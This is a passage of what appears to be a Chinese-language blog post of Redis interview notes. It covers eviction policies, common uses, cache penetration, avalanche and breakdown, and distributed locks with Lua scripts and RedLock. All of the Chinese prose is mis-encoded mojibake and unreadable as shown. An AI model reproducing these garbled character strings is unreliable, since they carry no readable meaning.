<li>volatile-randomï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ï¼ˆserver.db[i].expiresï¼‰ä¸­ä»»æ„é€‰æ‹©æ•°æ®æ·˜æ±°</li>
<li>allkeys-lruï¼šä»æ•°æ®é›†ï¼ˆserver.db[i].dictï¼‰ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°</li>
<li>allkeys-randomï¼šä»æ•°æ®é›†ï¼ˆserver.db[i].dictï¼‰ä¸­ä»»æ„é€‰æ‹©æ•°æ®æ·˜æ±°</li>
<li>no-envictionï¼šç¦æ­¢é©±é€æ•°æ®ï¼Œæ–°å†™å…¥æ“ä½œä¼šæŠ¥é”™</li>
</ul>
<p>æ³¨æ„ï¼šå¦‚æœæ²¡æœ‰è®¾ç½® è¿‡æœŸæ—¶é—´çš„key, å¹¶ä¸”æ·˜æ±°æœºåˆ¶æ˜¯volatile-lru, volatile-random å’Œ volatile-ttl ä¸­çš„ä¸€ä¸ªï¼Œé‚£ä¹ˆå°±æ— æ³•å®ç°æ·˜æ±°ï¼Œä¸no-evictionåŸºæœ¬ä¸Šä¸€è‡´ã€‚</p>
<h2 id="4-9-Redisåœ¨é¡¹ç›®ä¸­çš„å“ªäº›åœ°æ–¹æœ‰ç”¨åˆ°ï¼Œè§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ"><a href="#4-9-Redisåœ¨é¡¹ç›®ä¸­çš„å“ªäº›åœ°æ–¹æœ‰ç”¨åˆ°ï¼Œè§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ" class="headerlink" title="4.9.Redisåœ¨é¡¹ç›®ä¸­çš„å“ªäº›åœ°æ–¹æœ‰ç”¨åˆ°ï¼Œè§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ"></a>4.9.Redisåœ¨é¡¹ç›®ä¸­çš„å“ªäº›åœ°æ–¹æœ‰ç”¨åˆ°ï¼Œè§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰å…±äº«session</p>
<p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸‹ï¼ŒæœåŠ¡ä¼šéƒ¨ç½²åœ¨ä¸åŒçš„tomcatï¼Œå› æ­¤å¤šä¸ªtomcatçš„sessionæ— æ³•å…±äº«ï¼Œä»¥å‰å­˜å‚¨åœ¨sessionä¸­çš„æ•°æ®æ— æ³•å®ç°å…±äº«ï¼Œå¯ä»¥ç”¨redisä»£æ›¿sessionï¼Œè§£å†³åˆ†å¸ƒå¼ç³»ç»Ÿé—´æ•°æ®å…±äº«é—®é¢˜ã€‚</p>
<p>ï¼ˆ2ï¼‰æ•°æ®ç¼“å­˜</p>
<p>Redisé‡‡ç”¨å†…å­˜å­˜å‚¨ï¼Œè¯»å†™æ•ˆç‡è¾ƒé«˜ã€‚æˆ‘ä»¬å¯ä»¥æŠŠæ•°æ®åº“çš„è®¿é—®é¢‘ç‡é«˜çš„çƒ­ç‚¹æ•°æ®å­˜å‚¨åˆ°redisä¸­ï¼Œè¿™æ ·ç”¨æˆ·è¯·æ±‚æ—¶ä¼˜å…ˆä»redisä¸­è¯»å–ï¼Œå‡å°‘æ•°æ®åº“å‹åŠ›ï¼Œæé«˜å¹¶å‘èƒ½åŠ›ã€‚</p>
<p>ï¼ˆ3ï¼‰å¼‚æ­¥é˜Ÿåˆ—</p>
<p>Reidsåœ¨å†…å­˜å­˜å‚¨å¼•æ“é¢†åŸŸçš„ä¸€å¤§ä¼˜ç‚¹æ˜¯æä¾› list å’Œ set æ“ä½œï¼Œè¿™ä½¿å¾—Redisèƒ½ä½œä¸ºä¸€ä¸ªå¾ˆå¥½çš„æ¶ˆæ¯é˜Ÿåˆ—å¹³å°æ¥ä½¿ç”¨ã€‚è€Œä¸”Redisä¸­è¿˜æœ‰pub&#x2F;subè¿™æ ·çš„ä¸“ç”¨ç»“æ„ï¼Œç”¨äº1å¯¹Nçš„æ¶ˆæ¯é€šä¿¡æ¨¡å¼ã€‚</p>
<p>ï¼ˆ4ï¼‰æ’è¡Œæ¦œ&#x2F;è®¡æ•°å™¨</p>
<p>Redisåœ¨å†…å­˜ä¸­å¯¹æ•°å­—è¿›è¡Œé€’å¢æˆ–é€’å‡çš„æ“ä½œå®ç°çš„éå¸¸å¥½ã€‚é›†åˆï¼ˆSetï¼‰å’Œæœ‰åºé›†åˆï¼ˆSorted Setï¼‰ä¹Ÿä½¿å¾—æˆ‘ä»¬åœ¨æ‰§è¡Œè¿™äº›æ“ä½œçš„æ—¶å€™å˜çš„éå¸¸ç®€å•ï¼ŒRedisåªæ˜¯æ­£å¥½æä¾›äº†è¿™ä¸¤ç§æ•°æ®ç»“æ„ã€‚</p>
<p>ï¼ˆ5ï¼‰åˆ†å¸ƒå¼é”</p>
<p>Redisä¸­çš„ä¹è§‚é”æœºåˆ¶ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°åˆ†å¸ƒå¼é”çš„æ•ˆæœï¼Œç”¨äºè§£å†³åˆ†å¸ƒå¼ç³»ç»Ÿä¸‹çš„å¤šçº¿ç¨‹å®‰å…¨é—®é¢˜</p>
<h2 id="4-10-Redisçš„ç¼“å­˜å‡»ç©¿ï¼ˆçƒ­ç‚¹Keyé—®é¢˜ï¼‰ã€ç¼“å­˜é›ªå´©ã€ç¼“å­˜ç©¿é€é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ"><a href="#4-10-Redisçš„ç¼“å­˜å‡»ç©¿ï¼ˆçƒ­ç‚¹Keyé—®é¢˜ï¼‰ã€ç¼“å­˜é›ªå´©ã€ç¼“å­˜ç©¿é€é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ" class="headerlink" title="4.10.Redisçš„ç¼“å­˜å‡»ç©¿ï¼ˆçƒ­ç‚¹Keyé—®é¢˜ï¼‰ã€ç¼“å­˜é›ªå´©ã€ç¼“å­˜ç©¿é€é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ"></a>4.10.Redisçš„ç¼“å­˜å‡»ç©¿ï¼ˆçƒ­ç‚¹Keyé—®é¢˜ï¼‰ã€ç¼“å­˜é›ªå´©ã€ç¼“å­˜ç©¿é€é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</h2><h3 id="1ï¼‰ç¼“å­˜ç©¿é€"><a href="#1ï¼‰ç¼“å­˜ç©¿é€" class="headerlink" title="1ï¼‰ç¼“å­˜ç©¿é€"></a>1ï¼‰ç¼“å­˜ç©¿é€</h3><p>ä¸€èˆ¬çš„ç¼“å­˜ç³»ç»Ÿï¼Œéƒ½æ˜¯æŒ‰ç…§keyå»ç¼“å­˜æŸ¥è¯¢ï¼Œå¦‚æœä¸å­˜åœ¨å¯¹åº”çš„valueï¼Œå°±åº”è¯¥å»åç«¯ç³»ç»ŸæŸ¥æ‰¾ï¼ˆæ¯”å¦‚DBï¼‰ã€‚ä¸€äº›æ¶æ„çš„è¯·æ±‚ä¼šæ•…æ„æŸ¥è¯¢ä¸å­˜åœ¨çš„key,è¯·æ±‚é‡å¾ˆå¤§ï¼Œå°±ä¼šå¯¹åç«¯ç³»ç»Ÿé€ æˆå¾ˆå¤§çš„å‹åŠ›ã€‚è¿™å°±å«åšç¼“å­˜ç©¿é€ã€‚</p>
<p>å¦‚ä½•é¿å…ï¼Ÿ</p>
<ul>
<li>å¯¹æŸ¥è¯¢ç»“æœä¸ºç©ºçš„æƒ…å†µä¹Ÿè¿›è¡Œç¼“å­˜ï¼Œç¼“å­˜æ—¶é—´è®¾ç½®çŸ­ä¸€ç‚¹ï¼Œæˆ–è€…è¯¥keyå¯¹åº”çš„æ•°æ®insertäº†ä¹‹åé‡ç½®ç¼“å­˜ã€‚</li>
<li>åˆ©ç”¨å¸ƒéš†è¿‡æ»¤å™¨ï¼Œå¯¹ä¸å­˜åœ¨çš„keyè¿›è¡Œåˆ¤æ–­è¿‡æ»¤ã€‚</li>
</ul>
<h3 id="2ï¼‰ç¼“å­˜é›ªå´©"><a href="#2ï¼‰ç¼“å­˜é›ªå´©" class="headerlink" title="2ï¼‰ç¼“å­˜é›ªå´©"></a>2ï¼‰ç¼“å­˜é›ªå´©</h3><p>ç¼“å­˜é›ªå´©ï¼Œæ˜¯æŒ‡åœ¨æŸä¸€ä¸ªæ—¶é—´æ®µï¼Œç¼“å­˜é›†ä¸­è¿‡æœŸå¤±æ•ˆã€‚å¯¹è¿™æ‰¹æ•°æ®çš„è®¿é—®æŸ¥è¯¢ï¼Œéƒ½è½åˆ°äº†æ•°æ®åº“ä¸Šï¼Œå¯¹äºæ•°æ®åº“è€Œè¨€ï¼Œå°±ä¼šäº§ç”Ÿå‘¨æœŸæ€§çš„å‹åŠ›æ³¢å³°ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>æ•°æ®åˆ†ç±»åˆ†æ‰¹å¤„ç†ï¼šé‡‡å–ä¸åŒåˆ†ç±»æ•°æ®ï¼Œç¼“å­˜ä¸åŒå‘¨æœŸ</li>
<li>çƒ­ç‚¹æ•°æ®ç¼“å­˜æ—¶é—´é•¿ä¸€äº›ï¼Œå†·é—¨æ•°æ®ç¼“å­˜æ—¶é—´çŸ­ä¸€äº›</li>
<li>é¿å…redisèŠ‚ç‚¹å®•æœºå¼•èµ·é›ªå´©ï¼Œæ­å»ºä¸»ä»é›†ç¾¤ï¼Œä¿è¯é«˜å¯ç”¨</li>
</ul>
<h3 id="3ï¼‰ç¼“å­˜å‡»ç©¿"><a href="#3ï¼‰ç¼“å­˜å‡»ç©¿" class="headerlink" title="3ï¼‰ç¼“å­˜å‡»ç©¿"></a>3ï¼‰ç¼“å­˜å‡»ç©¿</h3><p>ç¼“å­˜å‡»ç©¿ï¼Œæ˜¯æŒ‡ä¸€ä¸ªkeyéå¸¸çƒ­ç‚¹ï¼Œåœ¨ä¸åœçš„æ‰›ç€å¤§å¹¶å‘ï¼Œå¤§å¹¶å‘é›†ä¸­å¯¹è¿™ä¸€ä¸ªç‚¹è¿›è¡Œè®¿é—®ï¼Œå½“è¿™ä¸ªkeyåœ¨å¤±æ•ˆçš„ç¬é—´ï¼ŒæŒç»­çš„å¤§å¹¶å‘å°±ç©¿ç ´ç¼“å­˜ï¼Œç›´æ¥è¯·æ±‚æ•°æ®åº“ï¼Œå°±åƒåœ¨ä¸€ä¸ªå±éšœä¸Šå‡¿å¼€äº†ä¸€ä¸ªæ´ã€‚</p>
<p>è§£å†³æ€è·¯ï¼šçƒ­ç‚¹çš„keyæ°¸ä¸è¿‡æœŸå³å¯ã€‚</p>
<h2 id="4-11-Rediså®ç°åˆ†å¸ƒå¼é”"><a href="#4-11-Rediså®ç°åˆ†å¸ƒå¼é”" class="headerlink" title="4.11.Rediså®ç°åˆ†å¸ƒå¼é”"></a>4.11.Rediså®ç°åˆ†å¸ƒå¼é”</h2><p>åˆ†å¸ƒå¼é”è¦æ»¡è¶³çš„æ¡ä»¶ï¼š</p>
<ul>
<li>å¤šè¿›ç¨‹äº’æ–¥ï¼šåŒä¸€æ—¶åˆ»ï¼Œåªæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥è·å–é”</li>
<li>ä¿è¯é”å¯ä»¥é‡Šæ”¾ï¼šä»»åŠ¡ç»“æŸæˆ–å‡ºç°å¼‚å¸¸ï¼Œé”ä¸€å®šè¦é‡Šæ”¾ï¼Œé¿å…æ­»é”</li>
<li>é˜»å¡é”ï¼ˆå¯é€‰ï¼‰ï¼šè·å–é”å¤±è´¥æ—¶å¯å¦é‡è¯•</li>
<li>é‡å…¥é”ï¼ˆå¯é€‰ï¼‰ï¼šè·å–é”çš„ä»£ç é€’å½’è°ƒç”¨æ—¶ï¼Œä¾ç„¶å¯ä»¥è·å–é”</li>
</ul>
<h3 id="1ï¼‰æœ€åŸºæœ¬çš„åˆ†å¸ƒå¼é”ï¼š"><a href="#1ï¼‰æœ€åŸºæœ¬çš„åˆ†å¸ƒå¼é”ï¼š" class="headerlink" title="1ï¼‰æœ€åŸºæœ¬çš„åˆ†å¸ƒå¼é”ï¼š"></a>1ï¼‰æœ€åŸºæœ¬çš„åˆ†å¸ƒå¼é”ï¼š</h3><p>åˆ©ç”¨Redisçš„setnxå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤çš„ç‰¹å¾æ—¶å¦‚æœå¤šæ¬¡æ‰§è¡Œï¼Œåªæœ‰ç¬¬ä¸€æ¬¡æ‰§è¡Œä¼šæˆåŠŸï¼Œå¯ä»¥å®ç°<code>äº’æ–¥</code>çš„æ•ˆæœã€‚ä½†æ˜¯ä¸ºäº†ä¿è¯æœåŠ¡å®•æœºæ—¶ä¹Ÿå¯ä»¥é‡Šæ”¾é”ï¼Œéœ€è¦åˆ©ç”¨expireå‘½ä»¤ç»™é”è®¾ç½®ä¸€ä¸ªæœ‰æ•ˆæœŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setnx lock thread-01 # å°è¯•è·å–é”</span><br><span class="line">expire lock 10 # è®¾ç½®æœ‰æ•ˆæœŸ</span><br></pre></td></tr></table></figure>

<p><strong>é¢è¯•å®˜é—®é¢˜1</strong>ï¼šå¦‚æœexpireä¹‹å‰æœåŠ¡å®•æœºæ€ä¹ˆåŠï¼Ÿ</p>
<p>è¦ä¿è¯setnxå’Œexpireå‘½ä»¤çš„åŸå­æ€§ã€‚redisçš„setå‘½ä»¤å¯ä»¥æ»¡è¶³ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set key value [NX] [EX time] </span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ·»åŠ nxå’Œexçš„é€‰é¡¹ï¼š</p>
<ul>
<li>NXï¼šä¸setnxä¸€è‡´ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡ŒæˆåŠŸ</li>
<li>EXï¼šè®¾ç½®è¿‡æœŸæ—¶é—´</li>
</ul>
<p><strong>é¢è¯•å®˜é—®é¢˜2</strong>ï¼šé‡Šæ”¾é”çš„æ—¶å€™ï¼Œå¦‚æœè‡ªå·±çš„é”å·²ç»è¿‡æœŸäº†ï¼Œæ­¤æ—¶ä¼šå‡ºç°å®‰å…¨æ¼æ´ï¼Œå¦‚ä½•è§£å†³ï¼Ÿ</p>
<p>åœ¨é”ä¸­å­˜å‚¨å½“å‰è¿›ç¨‹å’Œçº¿ç¨‹æ ‡è¯†ï¼Œé‡Šæ”¾é”æ—¶å¯¹é”çš„æ ‡è¯†åˆ¤æ–­ï¼Œå¦‚æœæ˜¯è‡ªå·±çš„åˆ™åˆ é™¤ï¼Œä¸æ˜¯åˆ™æ”¾å¼ƒæ“ä½œã€‚</p>
<p>ä½†æ˜¯è¿™ä¸¤æ­¥æ“ä½œè¦ä¿è¯åŸå­æ€§ï¼Œéœ€è¦é€šè¿‡Luaè„šæœ¬æ¥å®ç°ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if redis.call(&quot;get&quot;,KEYS[1]) == ARGV[1] then</span><br><span class="line">    redis.call(&quot;del&quot;,KEYS[1])</span><br><span class="line">end</span><br></pre></td></tr></table></figure>



<h3 id="2-å¯é‡å…¥åˆ†å¸ƒå¼é”"><a href="#2-å¯é‡å…¥åˆ†å¸ƒå¼é”" class="headerlink" title="2)å¯é‡å…¥åˆ†å¸ƒå¼é”"></a>2)å¯é‡å…¥åˆ†å¸ƒå¼é”</h3><p>å¦‚æœæœ‰é‡å…¥çš„éœ€æ±‚ï¼Œåˆ™é™¤äº†åœ¨é”ä¸­è®°å½•è¿›ç¨‹æ ‡è¯†ï¼Œè¿˜è¦è®°å½•é‡è¯•æ¬¡æ•°ï¼Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142558.png" alt="1574824172228"> </p>
<p>ä¸‹é¢æˆ‘ä»¬å‡è®¾é”çš„keyä¸ºâ€œ<code>lock</code>â€ï¼ŒhashKeyæ˜¯å½“å‰çº¿ç¨‹çš„idï¼šâ€œ<code>threadId</code>â€ï¼Œé”è‡ªåŠ¨é‡Šæ”¾æ—¶é—´å‡è®¾ä¸º20</p>
<p>è·å–é”çš„æ­¥éª¤ï¼š</p>
<ul>
<li>1ã€åˆ¤æ–­lockæ˜¯å¦å­˜åœ¨ <code>EXISTS lock</code><ul>
<li>å­˜åœ¨ï¼Œè¯´æ˜æœ‰äººè·å–é”äº†ï¼Œä¸‹é¢åˆ¤æ–­æ˜¯ä¸æ˜¯è‡ªå·±çš„é”<ul>
<li>åˆ¤æ–­å½“å‰çº¿ç¨‹idä½œä¸ºhashKeyæ˜¯å¦å­˜åœ¨ï¼š<code>HEXISTS lock threadId</code><ul>
<li>ä¸å­˜åœ¨ï¼Œè¯´æ˜é”å·²ç»æœ‰äº†ï¼Œä¸”ä¸æ˜¯è‡ªå·±è·å–çš„ï¼Œé”è·å–å¤±è´¥ï¼Œend</li>
<li>å­˜åœ¨ï¼Œè¯´æ˜æ˜¯è‡ªå·±è·å–çš„é”ï¼Œé‡å…¥æ¬¡æ•°+1ï¼š<code>HINCRBY lock threadId 1</code>ï¼Œå»åˆ°æ­¥éª¤3</li>
</ul>
</li>
</ul>
</li>
<li>2ã€ä¸å­˜åœ¨ï¼Œè¯´æ˜å¯ä»¥è·å–é”ï¼Œ<code>HSET key threadId 1</code></li>
<li>3ã€è®¾ç½®é”è‡ªåŠ¨é‡Šæ”¾æ—¶é—´ï¼Œ<code>EXPIRE lock 20</code></li>
</ul>
</li>
</ul>
<p>é‡Šæ”¾é”çš„æ­¥éª¤ï¼š</p>
<ul>
<li>1ã€åˆ¤æ–­å½“å‰çº¿ç¨‹idä½œä¸ºhashKeyæ˜¯å¦å­˜åœ¨ï¼š<code>HEXISTS lock threadId</code><ul>
<li>ä¸å­˜åœ¨ï¼Œè¯´æ˜é”å·²ç»å¤±æ•ˆï¼Œä¸ç”¨ç®¡äº†</li>
<li>å­˜åœ¨ï¼Œè¯´æ˜é”è¿˜åœ¨ï¼Œé‡å…¥æ¬¡æ•°å‡1ï¼š<code>HINCRBY lock threadId -1</code>ï¼Œè·å–æ–°çš„é‡å…¥æ¬¡æ•°</li>
</ul>
</li>
<li>2ã€åˆ¤æ–­é‡å…¥æ¬¡æ•°æ˜¯å¦ä¸º0ï¼š<ul>
<li>ä¸º0ï¼Œè¯´æ˜é”å…¨éƒ¨é‡Šæ”¾ï¼Œåˆ é™¤keyï¼š<code>DEL lock</code></li>
<li>å¤§äº0ï¼Œè¯´æ˜é”è¿˜åœ¨ä½¿ç”¨ï¼Œé‡ç½®æœ‰æ•ˆæ—¶é—´ï¼š<code>EXPIRE lock 20</code></li>
</ul>
</li>
</ul>
<p>å¯¹åº”çš„Luaè„šæœ¬å¦‚ä¸‹ï¼š</p>
<p>é¦–å…ˆæ˜¯è·å–é”ï¼š</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]; <span class="comment">-- é”çš„key</span></span><br><span class="line"><span class="keyword">local</span> threadId = ARGV[<span class="number">1</span>]; <span class="comment">-- çº¿ç¨‹å”¯ä¸€æ ‡è¯†</span></span><br><span class="line"><span class="keyword">local</span> releaseTime = ARGV[<span class="number">2</span>]; <span class="comment">-- é”çš„è‡ªåŠ¨é‡Šæ”¾æ—¶é—´</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;exists&#x27;</span>, key) == <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">	redis.call(<span class="string">&#x27;hset&#x27;</span>, key, threadId, <span class="string">&#x27;1&#x27;</span>); <span class="comment">-- ä¸å­˜åœ¨, è·å–é”</span></span><br><span class="line">	redis.call(<span class="string">&#x27;expire&#x27;</span>, key, releaseTime); <span class="comment">-- è®¾ç½®æœ‰æ•ˆæœŸ</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; <span class="comment">-- è¿”å›ç»“æœ</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;hexists&#x27;</span>, key, threadId) == <span class="number">1</span>) <span class="keyword">then</span> <span class="comment">-- é”å·²ç»å­˜åœ¨ï¼Œåˆ¤æ–­threadIdæ˜¯å¦æ˜¯è‡ªå·±	</span></span><br><span class="line">	redis.call(<span class="string">&#x27;hincrby&#x27;</span>, key, threadId, <span class="string">&#x27;1&#x27;</span>); <span class="comment">-- ä¸å­˜åœ¨, è·å–é”ï¼Œé‡å…¥æ¬¡æ•°+1</span></span><br><span class="line">	redis.call(<span class="string">&#x27;expire&#x27;</span>, key, releaseTime); <span class="comment">-- è®¾ç½®æœ‰æ•ˆæœŸ</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; <span class="comment">-- è¿”å›ç»“æœ</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">-- ä»£ç èµ°åˆ°è¿™é‡Œ,è¯´æ˜è·å–é”çš„ä¸æ˜¯è‡ªå·±ï¼Œè·å–é”å¤±è´¥</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæ˜¯é‡Šæ”¾é”ï¼š</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]; <span class="comment">-- é”çš„key</span></span><br><span class="line"><span class="keyword">local</span> threadId = ARGV[<span class="number">1</span>]; <span class="comment">-- çº¿ç¨‹å”¯ä¸€æ ‡è¯†</span></span><br><span class="line"><span class="keyword">local</span> releaseTime = ARGV[<span class="number">2</span>]; <span class="comment">-- é”çš„è‡ªåŠ¨é‡Šæ”¾æ—¶é—´</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (redis.call(<span class="string">&#x27;HEXISTS&#x27;</span>, key, threadId) == <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- åˆ¤æ–­å½“å‰é”æ˜¯å¦è¿˜æ˜¯è¢«è‡ªå·±æŒæœ‰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>; <span class="comment">-- å¦‚æœå·²ç»ä¸æ˜¯è‡ªå·±ï¼Œåˆ™ç›´æ¥è¿”å›</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">local</span> count = redis.call(<span class="string">&#x27;HINCRBY&#x27;</span>, key, threadId, <span class="number">-1</span>); <span class="comment">-- æ˜¯è‡ªå·±çš„é”ï¼Œåˆ™é‡å…¥æ¬¡æ•°-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- åˆ¤æ–­æ˜¯å¦é‡å…¥æ¬¡æ•°æ˜¯å¦å·²ç»ä¸º0</span></span><br><span class="line">    redis.call(<span class="string">&#x27;EXPIRE&#x27;</span>, key, releaseTime); <span class="comment">-- å¤§äº0è¯´æ˜ä¸èƒ½é‡Šæ”¾é”ï¼Œé‡ç½®æœ‰æ•ˆæœŸç„¶åè¿”å›</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    redis.call(<span class="string">&#x27;DEL&#x27;</span>, key); <span class="comment">-- ç­‰äº0è¯´æ˜å¯ä»¥é‡Šæ”¾é”ï¼Œç›´æ¥åˆ é™¤</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>



<h3 id="3-é«˜å¯ç”¨çš„é”"><a href="#3-é«˜å¯ç”¨çš„é”" class="headerlink" title="3)é«˜å¯ç”¨çš„é”"></a>3)é«˜å¯ç”¨çš„é”</h3><p><code>é¢è¯•å®˜é—®é¢˜</code>ï¼šredisåˆ†å¸ƒå¼é”ä¾èµ–ä¸redisï¼Œå¦‚æœrediså®•æœºåˆ™é”å¤±æ•ˆã€‚å¦‚ä½•è§£å†³ï¼Ÿ</p>
<p>æ­¤æ—¶å¤§å¤šæ•°åŒå­¦ä¼šå›ç­”è¯´ï¼šæ­å»ºä¸»ä»é›†ç¾¤ï¼Œåšæ•°æ®å¤‡ä»½ã€‚</p>
<p>è¿™æ ·å°±è¿›å…¥äº†é™·é˜±ï¼Œå› ä¸ºé¢è¯•å®˜çš„ä¸‹ä¸€ä¸ªé—®é¢˜å°±æ¥äº†ï¼š</p>
<p><code>é¢è¯•å®˜é—®é¢˜</code>ï¼šå¦‚æœæ­å»ºä¸»ä»é›†ç¾¤åšæ•°æ®å¤‡ä»½æ—¶ï¼Œè¿›ç¨‹Aè·å–é”ï¼Œmasterè¿˜æ²¡æœ‰æŠŠæ•°æ®å¤‡ä»½åˆ°slaveï¼Œmasterå®•æœºï¼Œslaveå‡çº§ä¸ºmasterï¼Œæ­¤æ—¶åŸæ¥é”å¤±æ•ˆï¼Œå…¶å®ƒè¿›ç¨‹ä¹Ÿå¯ä»¥è·å–é”ï¼Œå‡ºç°å®‰å…¨é—®é¢˜ã€‚å¦‚ä½•è§£å†³ï¼Ÿ</p>
<p>å…³äºè¿™ä¸ªé—®é¢˜ï¼ŒRediså®˜ç½‘ç»™å‡ºäº†è§£å†³æ–¹æ¡ˆï¼Œä½¿ç”¨RedLockæ€è·¯å¯ä»¥è§£å†³ï¼š</p>
<blockquote>
<p>åœ¨Redisçš„åˆ†å¸ƒå¼ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å‡è®¾æœ‰Nä¸ªRedis masterã€‚è¿™äº›èŠ‚ç‚¹å®Œå…¨äº’ç›¸ç‹¬ç«‹ï¼Œä¸å­˜åœ¨ä¸»ä»å¤åˆ¶æˆ–è€…å…¶ä»–é›†ç¾¤åè°ƒæœºåˆ¶ã€‚ä¹‹å‰æˆ‘ä»¬å·²ç»æè¿°äº†åœ¨Rediså•å®ä¾‹ä¸‹æ€ä¹ˆå®‰å…¨åœ°è·å–å’Œé‡Šæ”¾é”ã€‚æˆ‘ä»¬ç¡®ä¿å°†åœ¨æ¯ï¼ˆN)ä¸ªå®ä¾‹ä¸Šä½¿ç”¨æ­¤æ–¹æ³•è·å–å’Œé‡Šæ”¾é”ã€‚åœ¨è¿™ä¸ªæ ·ä¾‹ä¸­ï¼Œæˆ‘ä»¬å‡è®¾æœ‰5ä¸ªRedis masterèŠ‚ç‚¹ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒåˆç†çš„è®¾ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨5å°æœºå™¨ä¸Šé¢æˆ–è€…5å°è™šæ‹Ÿæœºä¸Šé¢è¿è¡Œè¿™äº›å®ä¾‹ï¼Œè¿™æ ·ä¿è¯ä»–ä»¬ä¸ä¼šåŒæ—¶éƒ½å®•æ‰ã€‚</p>
<p>ä¸ºäº†å–åˆ°é”ï¼Œå®¢æˆ·ç«¯åº”è¯¥æ‰§è¡Œä»¥ä¸‹æ“ä½œ:</p>
<ol>
<li>è·å–å½“å‰Unixæ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚</li>
<li>ä¾æ¬¡å°è¯•ä»Nä¸ªå®ä¾‹ï¼Œä½¿ç”¨ç›¸åŒçš„keyå’Œéšæœºå€¼è·å–é”ã€‚åœ¨æ­¥éª¤2ï¼Œå½“å‘Redisè®¾ç½®é”æ—¶,å®¢æˆ·ç«¯åº”è¯¥è®¾ç½®ä¸€ä¸ªç½‘ç»œè¿æ¥å’Œå“åº”è¶…æ—¶æ—¶é—´ï¼Œè¿™ä¸ªè¶…æ—¶æ—¶é—´åº”è¯¥å°äºé”çš„å¤±æ•ˆæ—¶é—´ã€‚ä¾‹å¦‚ä½ çš„é”è‡ªåŠ¨å¤±æ•ˆæ—¶é—´ä¸º10ç§’ï¼Œåˆ™è¶…æ—¶æ—¶é—´åº”è¯¥åœ¨5-50æ¯«ç§’ä¹‹é—´ã€‚è¿™æ ·å¯ä»¥é¿å…æœåŠ¡å™¨ç«¯Rediså·²ç»æŒ‚æ‰çš„æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯è¿˜åœ¨æ­»æ­»åœ°ç­‰å¾…å“åº”ç»“æœã€‚å¦‚æœæœåŠ¡å™¨ç«¯æ²¡æœ‰åœ¨è§„å®šæ—¶é—´å†…å“åº”ï¼Œå®¢æˆ·ç«¯åº”è¯¥å°½å¿«å°è¯•å¦å¤–ä¸€ä¸ªRediså®ä¾‹ã€‚</li>
<li>å®¢æˆ·ç«¯ä½¿ç”¨å½“å‰æ—¶é—´å‡å»å¼€å§‹è·å–é”æ—¶é—´ï¼ˆæ­¥éª¤1è®°å½•çš„æ—¶é—´ï¼‰å°±å¾—åˆ°è·å–é”ä½¿ç”¨çš„æ—¶é—´ã€‚å½“ä¸”ä»…å½“ä»å¤§å¤šæ•°ï¼ˆè¿™é‡Œæ˜¯3ä¸ªèŠ‚ç‚¹ï¼‰çš„RedisèŠ‚ç‚¹éƒ½å–åˆ°é”ï¼Œå¹¶ä¸”ä½¿ç”¨çš„æ—¶é—´å°äºé”å¤±æ•ˆæ—¶é—´æ—¶ï¼Œé”æ‰ç®—è·å–æˆåŠŸã€‚</li>
